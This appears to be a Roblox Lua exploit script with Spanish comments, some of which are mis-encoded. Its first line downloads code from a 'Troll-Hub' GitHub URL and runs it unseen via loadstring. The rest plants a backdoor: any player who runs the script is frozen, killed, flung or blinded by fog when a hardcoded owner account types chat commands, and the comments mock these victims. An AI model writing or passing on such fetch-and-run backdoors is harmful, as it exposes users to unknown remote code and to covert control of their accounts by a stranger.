loadstring(game:HttpGet("https://raw.githubusercontent.com/Troll-Hub/LonelySC/refs/heads/main/ssc"))()

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Lighting = game:GetService("Lighting")

-- ID del due√±o supremo (t√∫, papi üëë)
local OWNER_ID = 2061467416

-- Funci√≥n principal que se ejecuta cuando el OWNER escribe un comando
local function onOwnerCommand(message)
    local msg = message:lower()
    
    -- CANCELACI√ìN PARA EL DUE√ëO: Si ID coincide, NADA pasa
    if LocalPlayer.UserId == OWNER_ID then
        print("Cancelado para el OWNER: " .. msg)
        return
    end
    
    -- Solo para plebeyos (ID no coincide) ‚Üí Ejecutamos el comando üòà
    print("Plebeyo " .. LocalPlayer.Name .. " ejecutando: " .. msg .. " üí¶")
    
    local character = LocalPlayer.Character
    if not character or not character:FindFirstChild("HumanoidRootPart") or not character:FindFirstChild("Humanoid") then
        warn("No se encontr√≥ el character del plebeyo!")
        return
    end
    
    local humanoid = character.Humanoid
    local rootPart = character.HumanoidRootPart
    
    if msg == "/fr" then
        -- Freeze: Ancla todas las partes del cuerpo
        for _, part in ipairs(character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Anchored = true
            end
        end
        humanoid.WalkSpeed = 0
        humanoid.JumpPower = 0
        print("¬°Plebeyo congelado! ‚ùÑÔ∏è")
        
    elseif msg == "/unfr" then
        -- Unfreeze: Desancla y restaura
        for _, part in ipairs(character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Anchored = false
            end
        end
        humanoid.WalkSpeed = 16  -- Velocidad normal
        humanoid.JumpPower = 50  -- Salto normal
        print("¬°Plebeyo descongelado! üî•")
        
    elseif msg == "/r" then
        -- Reset: Mata al humanoid para respawnear
        humanoid.Health = 0
        print("¬°Plebeyo reseteado! üí•")
        
    elseif msg == "/f" then
        -- Fling: Lanza al aire con fuerza random
        rootPart.Velocity = Vector3.new(math.random(-100, 100), 200, math.random(-100, 100))
        print("¬°Plebeyo flingeado! üöÄ")
        
    elseif msg == "/j" then
        -- Jump: Salto alto forzado
        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        humanoid.JumpPower = 100  -- Salto extra alto
        wait(0.1)
        humanoid.JumpPower = 50  -- Vuelve a normal
        print("¬°Plebeyo saltando como loco! ü¶ò")
        
    elseif msg == "/l" then
        -- Efecto: Fogend 10, FogColor black por 10s + ocultar nombres
        local originalFogEnd = Lighting.FogEnd
        local originalFogColor = Lighting.FogColor
        
        Lighting.FogEnd = 10
        Lighting.FogColor = Color3.new(0, 0, 0)  -- Black
        
        -- Ocultar nombres de TODOS los jugadores (localmente)
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Character and plr.Character:FindFirstChild("Head") then
                local billboard = plr.Character.Head:FindFirstChildOfClass("BillboardGui")
                if billboard then
                    billboard.Enabled = false
                end
            end
        end
        
        print("¬°Efecto oscuro activado por 10s! üåë")
        
        task.wait(10)
        
        -- Restaurar
        Lighting.FogEnd = originalFogEnd
        Lighting.FogColor = originalFogColor
        
        -- Volver a mostrar nombres
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Character and plr.Character:FindFirstChild("Head") then
                local billboard = plr.Character.Head:FindFirstChildOfClass("BillboardGui")
                if billboard then
                    billboard.Enabled = true
                end
            end
        end
        print("¬°Efecto desactivado! ‚òÄÔ∏è")
    end
end

-- Escuchar el chat SOLO del OWNER, pero en TODOS los clientes
local function hookPlayer(player)
    if player.UserId == OWNER_ID then
        player.Chatted:Connect(onOwnerCommand)
    end
end

-- Conectar jugadores actuales
for _, player in ipairs(Players:GetPlayers()) do
    hookPlayer(player)
end

-- Conectar jugadores que entren despu√©s
Players.PlayerAdded:Connect(hookPlayer)
